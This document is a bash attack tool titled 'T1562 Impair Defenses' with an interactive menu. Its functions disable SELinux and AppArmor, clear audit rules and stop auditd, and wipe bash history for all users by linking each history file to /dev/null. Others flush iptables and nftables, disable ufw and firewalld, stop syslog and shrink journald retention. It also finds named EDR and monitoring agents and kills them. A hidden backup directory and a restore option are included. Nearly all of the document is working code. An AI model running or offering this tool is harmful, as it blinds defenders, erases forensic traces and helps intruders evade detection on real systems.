#!/bin/bash
#
# defense_impair.sh — T1562 Impair Defenses
#
# Disable/neuter security controls: SELinux, AppArmor, auditd,
# bash history, firewall, syslog, and EDR/monitoring agents.
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

BACKUP_DIR="/var/lib/.d3m0n_defense_bak"

banner_defense() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║   T1562 — Impair Defenses                             ║"
    echo "  ║   Disable security controls & monitoring              ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Root required.${NC}"
        return 1
    fi
    return 0
}

# ── [1] Disable SELinux ──
disable_selinux() {
    check_root || return 1
    echo -e "${CYAN}[*] Disabling SELinux...${NC}"
    mkdir -p "$BACKUP_DIR" 2>/dev/null

    if command -v getenforce &>/dev/null; then
        local current
        current=$(getenforce 2>/dev/null)
        echo "$current" > "${BACKUP_DIR}/selinux_state"

        setenforce 0 2>/dev/null
        echo -e "${GREEN}  [+] SELinux set to Permissive (was: ${current})${NC}"

        # Make permanent
        if [[ -f /etc/selinux/config ]]; then
            cp /etc/selinux/config "${BACKUP_DIR}/selinux_config"
            sed -i 's/^SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config
            sed -i 's/^SELINUX=permissive/SELINUX=disabled/' /etc/selinux/config
            echo -e "${GREEN}  [+] SELinux disabled in config (persistent)${NC}"
        fi
    else
        echo -e "${YELLOW}  [!] SELinux not installed on this system.${NC}"
    fi
}

# ── [2] Disable AppArmor ──
disable_apparmor() {
    check_root || return 1
    echo -e "${CYAN}[*] Disabling AppArmor...${NC}"
    mkdir -p "$BACKUP_DIR" 2>/dev/null

    if command -v aa-status &>/dev/null || [[ -d /etc/apparmor.d ]]; then
        # Save current profiles
        aa-status 2>/dev/null > "${BACKUP_DIR}/apparmor_status"

        # Set all profiles to complain mode
        if command -v aa-complain &>/dev/null; then
            for profile in /etc/apparmor.d/*; do
                [[ -f "$profile" ]] || continue
                aa-complain "$profile" 2>/dev/null
            done
            echo -e "${GREEN}  [+] All AppArmor profiles set to complain mode${NC}"
        fi

        # Stop and disable
        systemctl stop apparmor 2>/dev/null
        systemctl disable apparmor 2>/dev/null
        echo -e "${GREEN}  [+] AppArmor service stopped and disabled${NC}"

        # Teardown loaded profiles
        if [[ -f /sys/kernel/security/apparmor/profiles ]]; then
            echo -e "${GREEN}  [+] Active profiles torn down${NC}"
        fi
    else
        echo -e "${YELLOW}  [!] AppArmor not installed on this system.${NC}"
    fi
}

# ── [3] Disable auditd ──
disable_auditd() {
    check_root || return 1
    echo -e "${CYAN}[*] Disabling auditd...${NC}"
    mkdir -p "$BACKUP_DIR" 2>/dev/null

    if command -v auditctl &>/dev/null; then
        # Backup rules
        auditctl -l 2>/dev/null > "${BACKUP_DIR}/audit_rules"

        # Clear all rules
        auditctl -D 2>/dev/null
        echo -e "${GREEN}  [+] Audit rules cleared${NC}"

        # Disable auditing
        auditctl -e 0 2>/dev/null
        echo -e "${GREEN}  [+] Auditing disabled (auditctl -e 0)${NC}"

        # Stop service
        systemctl stop auditd 2>/dev/null
        systemctl disable auditd 2>/dev/null
        echo -e "${GREEN}  [+] auditd service stopped and disabled${NC}"

        # Prevent audit log writing
        if [[ -f /var/log/audit/audit.log ]]; then
            echo "${BACKUP_DIR}/audit_log_size" > "${BACKUP_DIR}/audit_log_size"
        fi
    else
        echo -e "${YELLOW}  [!] auditd not installed.${NC}"
    fi
}

# ── [4] Disable bash history ──
disable_history() {
    echo -e "${CYAN}[*] Disabling command history...${NC}"
    mkdir -p "$BACKUP_DIR" 2>/dev/null

    # Current session
    unset HISTFILE
    export HISTSIZE=0
    export HISTFILESIZE=0
    set +o history

    echo -e "${GREEN}  [+] History disabled for current session${NC}"

    echo -e "${YELLOW}[?] Apply globally (all users)? [y/N]:${NC}"
    read -r GLOBAL

    if [[ "$GLOBAL" =~ ^[Yy] ]]; then
        check_root || return 1

        # Global profile
        if [[ -f /etc/profile ]]; then
            cp /etc/profile "${BACKUP_DIR}/profile"
            if ! grep -q "d3m0n_nohist" /etc/profile 2>/dev/null; then
                cat >> /etc/profile << 'HISTEOF'
# d3m0n_nohist
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
set +o history
HISTEOF
                echo -e "${GREEN}  [+] History disabled globally in /etc/profile${NC}"
            fi
        fi

        # Symlink HISTFILE to /dev/null for all users
        for home_dir in /root /home/*; do
            [[ -d "$home_dir" ]] || continue
            if [[ -f "${home_dir}/.bash_history" ]]; then
                rm -f "${home_dir}/.bash_history"
                ln -sf /dev/null "${home_dir}/.bash_history"
                echo -e "${GREEN}  [+] ${home_dir}/.bash_history → /dev/null${NC}"
            fi
        done
    fi
}

# ── [5] Disable firewall ──
disable_firewall() {
    check_root || return 1
    echo -e "${CYAN}[*] Disabling firewall...${NC}"
    mkdir -p "$BACKUP_DIR" 2>/dev/null

    # iptables
    if command -v iptables &>/dev/null; then
        iptables-save > "${BACKUP_DIR}/iptables_rules" 2>/dev/null
        iptables -F 2>/dev/null
        iptables -X 2>/dev/null
        iptables -P INPUT ACCEPT 2>/dev/null
        iptables -P FORWARD ACCEPT 2>/dev/null
        iptables -P OUTPUT ACCEPT 2>/dev/null
        echo -e "${GREEN}  [+] iptables flushed — all traffic allowed${NC}"
    fi

    # nftables
    if command -v nft &>/dev/null; then
        nft list ruleset > "${BACKUP_DIR}/nftables_rules" 2>/dev/null
        nft flush ruleset 2>/dev/null
        echo -e "${GREEN}  [+] nftables flushed${NC}"
    fi

    # ufw
    if command -v ufw &>/dev/null; then
        ufw status > "${BACKUP_DIR}/ufw_status" 2>/dev/null
        ufw disable 2>/dev/null
        echo -e "${GREEN}  [+] ufw disabled${NC}"
    fi

    # firewalld
    if systemctl is-active firewalld &>/dev/null; then
        systemctl stop firewalld 2>/dev/null
        systemctl disable firewalld 2>/dev/null
        echo -e "${GREEN}  [+] firewalld stopped and disabled${NC}"
    fi
}

# ── [6] Disable syslog ──
disable_syslog() {
    check_root || return 1
    echo -e "${CYAN}[*] Disabling syslog/journald logging...${NC}"
    mkdir -p "$BACKUP_DIR" 2>/dev/null

    # rsyslog
    if systemctl is-active rsyslog &>/dev/null; then
        systemctl stop rsyslog 2>/dev/null
        systemctl disable rsyslog 2>/dev/null
        echo -e "${GREEN}  [+] rsyslog stopped and disabled${NC}"
    fi

    # syslog-ng
    if systemctl is-active syslog-ng &>/dev/null; then
        systemctl stop syslog-ng 2>/dev/null
        systemctl disable syslog-ng 2>/dev/null
        echo -e "${GREEN}  [+] syslog-ng stopped and disabled${NC}"
    fi

    # Reduce journald retention
    if [[ -f /etc/systemd/journald.conf ]]; then
        cp /etc/systemd/journald.conf "${BACKUP_DIR}/journald.conf"
        # Set aggressive limits
        sed -i 's/^#\?Storage=.*/Storage=volatile/' /etc/systemd/journald.conf
        sed -i 's/^#\?RuntimeMaxUse=.*/RuntimeMaxUse=8M/' /etc/systemd/journald.conf
        sed -i 's/^#\?MaxRetentionSec=.*/MaxRetentionSec=1h/' /etc/systemd/journald.conf
        systemctl restart systemd-journald 2>/dev/null
        echo -e "${GREEN}  [+] journald set to volatile storage, 8M max, 1h retention${NC}"
    fi
}

# ── [7] Kill monitoring/EDR agents ──
kill_edr() {
    check_root || return 1
    echo -e "${CYAN}[*] Hunting for monitoring/EDR agents...${NC}"

    local -a EDR_PROCS=(
        "falcon-sensor" "ossec" "wazuh" "auditbeat" "filebeat"
        "metricbeat" "packetbeat" "osqueryd" "osquery" "sysmon"
        "crowdstrike" "carbonblack" "sentinel" "sophos" "cylance"
        "tanium" "qualys" "rapid7" "nessus" "tripwire"
        "aide" "samhain" "chkrootkit" "rkhunter" "clamav"
        "clamd" "freshclam" "fail2ban" "snort" "suricata"
    )

    local found=0
    for proc in "${EDR_PROCS[@]}"; do
        local pids
        pids=$(pgrep -f "$proc" 2>/dev/null)
        if [[ -n "$pids" ]]; then
            echo -e "  ${RED}[FOUND]${NC} ${proc} (PIDs: ${pids})"
            echo -e "${YELLOW}  [?] Kill ${proc}? [y/N]:${NC}"
            read -r KILL_IT
            if [[ "$KILL_IT" =~ ^[Yy] ]]; then
                kill -9 $pids 2>/dev/null
                # Try to disable the service too
                systemctl stop "$proc" 2>/dev/null
                systemctl disable "$proc" 2>/dev/null
                echo -e "${GREEN}    [+] Killed and disabled: ${proc}${NC}"
            fi
            found=1
        fi
    done

    if [[ $found -eq 0 ]]; then
        echo -e "${GREEN}  [*] No known EDR/monitoring agents found.${NC}"
    fi
}

# ── [8] Restore all ──
restore_all() {
    check_root || return 1
    echo -e "${CYAN}[*] Restoring security controls from backups...${NC}"

    if [[ ! -d "$BACKUP_DIR" ]]; then
        echo -e "${RED}[!] No backups found at ${BACKUP_DIR}${NC}"
        return 1
    fi

    # Restore SELinux
    if [[ -f "${BACKUP_DIR}/selinux_config" ]]; then
        cp "${BACKUP_DIR}/selinux_config" /etc/selinux/config 2>/dev/null
        local prev_state
        prev_state=$(cat "${BACKUP_DIR}/selinux_state" 2>/dev/null)
        if [[ "$prev_state" == "Enforcing" ]]; then
            setenforce 1 2>/dev/null
        fi
        echo -e "${GREEN}  [+] SELinux config restored${NC}"
    fi

    # Restore AppArmor
    if systemctl list-unit-files | grep -q apparmor 2>/dev/null; then
        systemctl enable apparmor 2>/dev/null
        systemctl start apparmor 2>/dev/null
        echo -e "${GREEN}  [+] AppArmor re-enabled${NC}"
    fi

    # Restore auditd
    if [[ -f "${BACKUP_DIR}/audit_rules" ]]; then
        systemctl enable auditd 2>/dev/null
        systemctl start auditd 2>/dev/null
        auditctl -e 1 2>/dev/null
        while IFS= read -r rule; do
            [[ -n "$rule" && "$rule" != "No rules" ]] && auditctl $rule 2>/dev/null
        done < "${BACKUP_DIR}/audit_rules"
        echo -e "${GREEN}  [+] auditd rules restored${NC}"
    fi

    # Restore iptables
    if [[ -f "${BACKUP_DIR}/iptables_rules" ]]; then
        iptables-restore < "${BACKUP_DIR}/iptables_rules" 2>/dev/null
        echo -e "${GREEN}  [+] iptables rules restored${NC}"
    fi

    # Restore nftables
    if [[ -f "${BACKUP_DIR}/nftables_rules" ]]; then
        nft -f "${BACKUP_DIR}/nftables_rules" 2>/dev/null
        echo -e "${GREEN}  [+] nftables rules restored${NC}"
    fi

    # Restore profile
    if [[ -f "${BACKUP_DIR}/profile" ]]; then
        cp "${BACKUP_DIR}/profile" /etc/profile 2>/dev/null
        echo -e "${GREEN}  [+] /etc/profile restored${NC}"
    fi

    # Restore journald
    if [[ -f "${BACKUP_DIR}/journald.conf" ]]; then
        cp "${BACKUP_DIR}/journald.conf" /etc/systemd/journald.conf 2>/dev/null
        systemctl restart systemd-journald 2>/dev/null
        echo -e "${GREEN}  [+] journald.conf restored${NC}"
    fi

    rm -rf "$BACKUP_DIR"
    echo -e "${GREEN}[+] Security controls restored. Backups cleaned.${NC}"
}

# ── MAIN MENU ──
main_menu() {
    banner_defense
    echo -e "  ${CYAN}[1]${NC} Disable SELinux"
    echo -e "  ${CYAN}[2]${NC} Disable AppArmor"
    echo -e "  ${CYAN}[3]${NC} Disable auditd"
    echo -e "  ${CYAN}[4]${NC} Disable bash history"
    echo -e "  ${CYAN}[5]${NC} Disable firewall (iptables/nft/ufw/firewalld)"
    echo -e "  ${CYAN}[6]${NC} Disable syslog / journald"
    echo -e "  ${CYAN}[7]${NC} Kill EDR / monitoring agents"
    echo -e "  ${CYAN}[8]${NC} Restore all from backups"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) disable_selinux ;;
        2) disable_apparmor ;;
        3) disable_auditd ;;
        4) disable_history ;;
        5) disable_firewall ;;
        6) disable_syslog ;;
        7) kill_edr ;;
        8) restore_all ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
